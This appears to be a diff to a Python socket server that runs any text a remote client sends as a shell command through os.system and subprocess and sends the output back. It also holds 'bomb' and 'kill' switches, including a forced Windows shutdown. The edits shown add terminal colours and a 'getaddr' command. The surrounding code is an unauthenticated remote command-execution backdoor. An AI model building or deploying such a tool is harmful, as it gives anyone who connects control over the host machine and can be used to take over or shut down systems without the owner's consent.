@@ -4,6 +4,18 @@ import os
 import sys
 import subprocess
 
+class colors:
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    DARKCYAN = '\033[36m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+
 bomb = False
 kill = False
 
@@ -23,7 +35,9 @@ def handle(clientsocket):
     if buf == '': return #client terminated connection
     #buf = buf.decode("utf-8")
     try:
+        print(colors.DARKCYAN)
         os.system(buf)
+        print(colors.END)
         returned = subprocess.check_output(buf)
         clientsocket.send(returned)
     except:
@@ -52,6 +66,12 @@ def handle(clientsocket):
                 os.system('shutdown /s /f')
             except:
                 print('Windows Kill failed')
+    if buf == 'getaddr':
+        print('Sending Host addr')
+        try:
+            clientsocket.send(servaddr.encode("UTF-8"))
+        except:
+            print('Faled to send addr')
 
 serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -64,8 +84,6 @@ serversocket.listen(10)
 while 1:
     #accept connections from outside
     (clientsocket, address) = serversocket.accept()
-    print('Sending Host Address')
-    clientsocket.send(servaddr.encode("UTF-8"))
     #Multiple Threads
     ct = Thread(target=handle, args=(clientsocket,))
     ct.start()
